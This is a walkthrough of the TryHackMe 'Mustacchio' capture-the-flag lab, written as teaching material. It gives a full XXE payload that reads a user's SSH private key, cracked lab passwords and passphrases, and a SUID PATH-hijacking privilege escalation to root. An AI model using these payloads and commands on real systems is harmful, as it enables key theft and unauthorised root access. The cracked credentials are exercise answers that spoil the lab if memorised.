Mustacchio CTF (TryHackMe)

1. Reconnaissance & Enumeration
I started by verifying connectivity to the target machine using ping. Once confirmed, I performed an initial port scan with Nmap.
  nmap 10.82.156.22
Scan results:
Port 22 (SSH): OpenSSH.
Port 80 (HTTP): Apache web server.

Web Enumeration (Port 80)
I inspected the robots.txt file, but it only contained the irrelevant directive “User-agent: * Disallow: /”.

I used Gobuster to brute force directories and discover hidden paths:
gobuster dir -u http://10.82.156.22 -w /usr/share/wordlists/dirb/common.txt

Gobuster revealed a /custom/ directory. It took me to a .css website (irrelevant), I deduced the possible existence of a scripts folder 
and tried to access /custom/js/.

There I found a forgotten backup file: users.bak.

{(WHILE PERFORMING A DEEPER SCAN NMAP -P- -T4) -> Port 8765 (HTTP): An additional port found.}

2. Exploitation

I downloaded the users.bak file and verified its type with the file command, which showed it to be an SQLite database.
Using sqlite3, I obtained the contents of the users table, obtaining the administrator password hash: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
I used John the Ripper with the rockyou.txt dictionary to crack the hash, obtaining the password in plain text: bulldog19.

Admin Panel Access & XXE Attack
With the credentials (admin:bulldog19), I logged into the admin panel located on port 8765.
The panel allowed comments to be left. When I submitted one, I noticed an alert indicating “Insert XML Code,” suggesting an XXE (XML External Entity) vulnerability. 
In addition, the source code of the page (ctl+U) contained a hidden comment: “Barry, you can now SSH in using your key!”
This confirmed my attack vector: use the XXE vulnerability to read the SSH private key (id_rsa) of the user Barry.

XXE payload used:
XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM “file:///home/barry/.ssh/id_rsa”> ]>
<comment>
  <name>&file;</name>
  <author>Zoe</author>
  <com>Test</com>
</comment>
When this payload was sent, the server processed the external entity and returned the contents of the RSA private key in the “Name” field.
SSH Access
The key obtained was encrypted (password protected).
I saved the key in an idddrsa file. 
I used ssh2john to convert it to a crackable format. (hash)
I used John the Ripper again to obtain the passphrase: “urieljames”.
Finally, I accessed the system:
chmod 600 id_rsa
ssh -i id_rsa barry@10.82.156.22

3. Privilege Escalation 
Once inside the system, I searched for binaries with SUID (Set User ID) permissions that would allow me to execute commands as root.
find / -perm -u=s -type f 2>/dev/null

The command revealed an unusual binary: /home/joe/live_log. When I ran strings on this binary, 
I discovered that it was calling the tail command without using its absolute path (it used tail instead of /usr/bin/tail).

Attack: Path Hijacking Since the binary relies on the PATH environment variable to find tail, I was able to hijack the execution:
I moved to /tmp (where I have write permissions).
I created a fake file called tail that invoked a shell:
echo “/bin/bash” > tail
chmod +x tail
I modified my PATH so that the system would search /tmp first:
export PATH=/tmp:$PATH
I ran the vulnerable binary:
/home/joe/live_log
The program executed my malicious script with the owner's (root) permissions, giving me a shell with maximum privileges.
